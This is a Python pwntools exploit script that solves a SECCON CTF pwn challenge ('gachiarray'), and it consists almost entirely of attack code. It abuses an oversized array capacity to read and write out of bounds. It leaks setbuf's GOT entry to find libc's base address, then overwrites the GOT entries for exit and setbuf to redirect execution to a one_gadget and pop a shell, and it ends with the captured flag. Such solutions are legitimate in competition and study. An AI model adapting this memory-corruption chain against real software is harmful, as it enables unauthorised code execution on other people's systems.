#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6", checksec=False)

HOST="gachiarray.seccon.games"
PORT=5000

context.binary = exe
context.log_level = 'debug'

gdbscript="""
# b*0x00000000004013FE
# b*0x0000000000401249
# b*0x401197
b*0x00000000004011F2
"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote(HOST, PORT)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)
rl = lambda: p.recvline().strip()
rn = lambda n: p.recvn(n)

def pkt(a,b,c):
    return p32(a) + p32(b) + p32(c)

s(pkt(0x80000000, 1, 0x41414141))   # capacity, size, initial

s(pkt(3, 0x80000000, 0))          

setbuf_got = 0x404000
idx = setbuf_got // 4
s(pkt(1, idx, 0))
ru(b'] = ')
leak = int(rl().strip())
if leak < 0:
    leak += 2**32

info(f"leak: {hex(leak)}")

setbuf_got = 0x404000+4
idx = setbuf_got // 4
s(pkt(1, idx, 0))
ru(b'] = ')
leak2 = int(rl().strip())
if leak2 < 0:
    leak2 += 2**32

info(f"leak2: {hex(leak2)}")

setbuf = (leak2 << 32) | leak
info(f"setbuf: {hex(setbuf)}")

libc.address = setbuf - libc.symbols['setbuf']
info(f"libc.address: {hex(libc.address)}")
list_og = [0x583ec, 0x583f3, 0xef4ce, 0xef52b]
og = libc.address + list_og[1]
main = 0x00000000004010F0+0xb
main1 = main & 0xFFFFFFFF
main2 = main >> 32
exit_got = 0x404020
idx2 = exit_got // 4

s(pkt(2, idx2, main1))
s(pkt(2, idx2+1, main2))
# s(pkt(9, 0, 0))
# s(pkt(0x80000000, 1, 0x41414141)) 
# s(pkt(3, 0x80000000, 0))    

info(f"og: {hex(og)}")
og1 = og & 0xFFFFFFFF
og2 = og >> 32
s(pkt(2, idx-1, og1))
s(pkt(2, idx, og2))
s(pkt(9, 0, 0))

p.interactive()

#SECCON{A=B;print(B);and_now_A_is_not_B_how?}